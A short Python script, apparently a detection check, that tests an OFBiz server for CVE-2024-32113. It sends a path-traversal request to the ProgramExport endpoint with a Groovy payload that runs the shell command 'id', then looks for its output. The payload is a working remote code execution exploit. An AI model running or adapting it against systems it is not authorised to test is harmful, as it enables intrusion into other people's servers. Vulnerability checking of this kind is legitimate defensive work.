#!/usr/bin/env python3
"""Checks if an OFBIZ instance at localhost:8443 is vulnerable to CVE-2024-32113."""

import re
import requests
import urllib3

TARGET = 'https://localhost:8443'


def TestIsVulnerable(target):
  """Tests if an OFBIZ instance at the given target is vulnerable to CVE-2024-32113.

  Args:
      target: The target URL of the OFBIZ instance.
  """
  url = f'{target}/webtools/control/forgotPassword/foo/../ProgramExport'
  headers = {'Content-Type': 'application/x-www-form-urlencoded'}
  data = {'groovyProgram': "throw new Exception('id'.execute().text);"}

  response = requests.post(url, headers=headers, data=data, verify=False)
  match = re.search(
      r'java\.lang\.Exception:(\s*uid=.* gid=.* groups=.*)', response.text
  )

  if match:
    print(f'OFBIZ Instance at {target} is vulnerable to CVE-2024-32113.')
  else:
    print(f'Vulnerability not detected in {target}.')


def main():
  urllib3.disable_warnings()
  TestIsVulnerable(TARGET)


if __name__ == '__main__':
  main()
